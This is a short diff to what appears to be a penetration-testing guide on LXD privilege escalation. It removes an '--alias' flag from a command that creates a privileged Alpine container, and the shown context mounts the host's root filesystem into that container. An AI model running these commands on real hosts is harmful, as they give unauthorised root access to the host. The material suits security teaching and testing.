@@ -50,7 +50,7 @@ lxc image list #You can see your new imported image
 Create a container and add root path
 
 ```bash
-lxc init alpine privesc -c security.privileged=true --alias=alpine
+lxc init alpine privesc -c security.privileged=true
 lxc list #List containers
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
